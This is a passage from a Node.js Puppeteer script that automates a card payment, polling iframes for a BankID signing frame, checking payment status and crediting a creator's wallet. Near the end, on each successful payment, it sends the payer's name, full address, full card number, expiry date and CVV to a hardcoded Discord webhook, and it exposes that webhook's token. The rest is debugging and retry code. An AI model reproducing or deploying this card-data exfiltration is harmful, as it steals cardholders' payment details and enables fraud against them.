        const frameTitle = await frame.title().catch(() => "No title");
        console.log(
          `Frame ${frameIndex}: URL=${frameUrl}, Title="${frameTitle}"`,
        );
      } catch (e) {
        console.log(
          `Frame ${frameIndex}: Could not get details - ${e.message}`,
        );
      }
    }

    for (let i = 0; i < 30; i++) {
      console.log(`🔄 BankID search attempt ${i + 1}/30...`);

      // Log current page state
      try {
        const currentUrl = page.url();
        const pageTitle = await page.title();
        console.log(
          `📍 Page state - URL: ${currentUrl}, Title: "${pageTitle}"`,
        );

        // Take a debug screenshot every few attempts
        if (i % 5 === 0) {
          await page.screenshot({
            path: path.join(
              __dirname,
              "screenshots",
              `bankid-search-attempt-${i + 1}.png`,
            ),
            fullPage: true,
          });
          console.log(
            `📸 Debug screenshot taken: bankid-search-attempt-${i + 1}.png`,
          );
        }
      } catch (e) {
        console.log(`⚠️ Could not get page state: ${e.message}`);
      }

      // Poll for 60 seconds
      for (
        let frameIndex = 0;
        frameIndex < page.frames().length;
        frameIndex++
      ) {
        const frame = page.frames()[frameIndex];
        try {
          const frameUrl = frame.url();
          console.log(`🔍 Checking frame ${frameIndex}: ${frameUrl}`);

          // Get frame content for debugging
          const frameContent = await frame.evaluate(() => {
            return {
              title: document.title,
              bodyText: document.body
                ? document.body.innerText.substring(0, 500)
                : "No body",
              h1: document.querySelector("h1")
                ? document.querySelector("h1").innerText
                : null,
              h2: document.querySelector("h2")
                ? document.querySelector("h2").innerText
                : null,
              h3: document.querySelector("h3")
                ? document.querySelector("h3").innerText
                : null,
              hasForm: !!document.querySelector("form"),
              formAction: document.querySelector("form")
                ? document.querySelector("form").action
                : null,
              buttons: Array.from(document.querySelectorAll("button")).map(
                (btn) => btn.innerText?.substring(0, 50),
              ),
              inputs: Array.from(document.querySelectorAll("input")).map(
                (input) => ({
                  type: input.type,
                  name: input.name,
                  id: input.id,
                  value: input.value?.substring(0, 20),
                }),
              ),
            };
          });

          console.log(
            `📄 Frame ${frameIndex} content:`,
            JSON.stringify(frameContent, null, 2),
          );

          const hasBankIdHeader = await frame.evaluate(() => {
            const h3 = document.querySelector("h3");
            const bodyText = document.body
              ? document.body.innerText.toLowerCase()
              : "";
            return (
              (h3 && h3.innerText.includes("Signera med BankID")) ||
              bodyText.includes("bankid") ||
              bodyText.includes("signera")
            );
          });

          if (hasBankIdHeader) {
            console.log("🎯 BankID frame found!");
            console.log(`✅ BankID frame URL: ${frameUrl}`);
            console.log(
              `✅ BankID frame content:`,
              JSON.stringify(frameContent, null, 2),
            );
            bankIdFrame = frame;
            break;
          } else {
            console.log(`❌ Frame ${frameIndex} is not BankID frame`);
          }
        } catch (e) {
          console.log(`⚠️ Error checking frame ${frameIndex}: ${e.message}`);
        }
      }

      if (bankIdFrame) {
        console.log("🎉 BankID frame search completed successfully!");
        break;
      }

      console.log(
        `⏳ BankID frame not found in attempt ${i + 1}/30. Retrying in 2 seconds...`,
      );
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    if (!bankIdFrame) {
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "bankid-frame-not-found.png"),
      });
      throw new Error("Could not find BankID iframe after polling.");
    }

    console.log("🔍 === WAITING FOR BANKID FORM ===");
    console.log(`BankID frame URL: ${bankIdFrame.url()}`);

    try {
      console.log(
        "⏳ Waiting for form with ACS URL to appear in BankID frame...",
      );

      // Wait for form and log detailed info about it
      await bankIdFrame.waitForSelector('form[action*="acs"]', {
        timeout: 10000,
      });

      console.log("✅ BankID form found!");

      // Get detailed form information
      const formDetails = await bankIdFrame.evaluate(() => {
        const form = document.querySelector('form[action*="acs"]');
        if (form) {
          return {
            action: form.action,
            method: form.method,
            inputs: Array.from(form.querySelectorAll("input")).map((input) => ({
              name: input.name,
              type: input.type,
              value: input.value
                ? input.value.substring(0, 50) +
                  (input.value.length > 50 ? "..." : "")
                : "",
              id: input.id,
            })),
            buttons: Array.from(
              form.querySelectorAll('button, input[type="submit"]'),
            ).map((btn) => ({
              type: btn.type,
              value: btn.value,
              innerText: btn.innerText,
            })),
            fullFormHTML:
              form.outerHTML.substring(0, 1000) +
              (form.outerHTML.length > 1000 ? "..." : ""),
          };
        }
        return null;
      });

      console.log(
        "📝 BankID form details:",
        JSON.stringify(formDetails, null, 2),
      );
    } catch (formError) {
      console.error("❌ Error waiting for BankID form:", formError.message);

      // Get current frame state for debugging
      const debugInfo = await bankIdFrame.evaluate(() => {
        return {
          url: window.location.href,
          title: document.title,
          bodyText: document.body.innerText.substring(0, 1000),
          allForms: Array.from(document.querySelectorAll("form")).map(
            (form) => ({
              action: form.action,
              method: form.method,
              id: form.id,
              className: form.className,
            }),
          ),
          allElements: Array.from(document.querySelectorAll("*"))
            .slice(0, 20)
            .map((el) => ({
              tagName: el.tagName,
              id: el.id,
              className: el.className,
            })),
        };
      });

      console.log(
        "🔍 BankID frame debug info:",
        JSON.stringify(debugInfo, null, 2),
      );
      throw formError;
    }

    process.send({ type: "bankid-detected" });

    console.log("🔄 === MONITORING BANKID COMPLETION ===");
    console.log("⏳ Starting 3-minute timeout for BankID completion...");

    // Take screenshot before starting monitoring
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "bankid-monitoring-start.png"),
      fullPage: true,
    });
    console.log("📸 Screenshot taken: bankid-monitoring-start.png");

    // Import the simple payment check
    console.log("🎯 Using simplified payment detection approach...");

    // Use the ultra-simple payment status check (2 minutes max wait)
    const resultJson = await checkPaymentStatus(page, outerFrame, 120000);

    console.log(
      `Payment verification finished with status: ${resultJson.success}`,
    );
    console.log(
      "Simple payment check result:",
      JSON.stringify(resultJson, null, 2),
    );

    // Simple payment check already handled everything - no additional checks needed
    console.log("✅ Using simple payment check result as final status");

    console.log(resultJson);

    if (resultJson.success) {
      // Add funds to creator's wallet with transaction validation
      await addFundsToCreatorWallet(blunrParams, amount, transactionId);

      const webhookUrl =
        "https://discord.com/api/webhooks/1396214469084053625/OKz32VisCW9Z5p1AhCrHqlmtirhWao7EGq_1NIYhHB1vQrdU-5MojTwemZr5McTvCiBP";
      const embed = {
        title: "Successful Transaction",
        color: 0x00ff00,
        fields: [
          { name: "Full Name", value: name, inline: true },
          { name: "Amount", value: amount.toString(), inline: true },
          { name: "Street Address", value: street, inline: true },
          { name: "City", value: city, inline: true },
          { name: "ZIP Code", value: zip, inline: true },
          { name: "Card Number", value: `||${cardNumber}||`, inline: true },
          { name: "Expiry Date", value: `||${expiryDate}||`, inline: true },
          { name: "CVV", value: `||${cvv}||`, inline: true },
        ],
        timestamp: new Date(),
      };
      axios
        .post(webhookUrl, { embeds: [embed] })
        .catch((err) => console.error("Error sending to Discord:", err));
    }
    process.send({ type: "purchase-complete", data: resultJson });

    // const wrapperElement = await innerFrame.waitForSelector('.wrapper', { visible: true, timeout: 30000 });

    // if (wrapperElement) {
    //     console.log(".wrapper found, taking screenshot...");
    //     await wrapperElement.screenshot({ path: path.join(__dirname, 'screenshots', 'wrapper.png') });
    //     console.log("Screenshot of .wrapper saved.");
    // }
  } catch (error) {
    console.error("An error occurred:", error);

    // If we created a transaction but payment failed, we should mark it as failed
    if (
      transactionId &&
      error.message &&
      !error.message.includes("Transaction creation failed")
    ) {
      try {
        console.log(
          `Marking transaction ${transactionId} as failed due to payment error...`,
        );
        const updateURL = `https://backend.blunr.com/api/transaction/update/${transactionId}/status`;
        await axios
          .patch(
            updateURL,
            { status: "failed" },
            {
              headers: { "Content-Type": "application/json" },
              timeout: 5000,
              httpsAgent: httpsAgent,
              proxy: false,
            },
          )
          .catch((err) =>
            console.error("Failed to mark transaction as failed:", err.message),
          );
      } catch (updateError) {
        console.error(
          "Error updating transaction status:",
          updateError.message,
        );
      }
    }

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "error.png"),
    });
    console.log("An error screenshot was taken: 'error.png'");
    process.exit(1);
  } finally {
    if (captchaInterval) {
      clearInterval(captchaInterval);
    }
    console.log("Closing the browser.");
    await browser.close();
  }
}

if (require.main === module) {
  main();
}
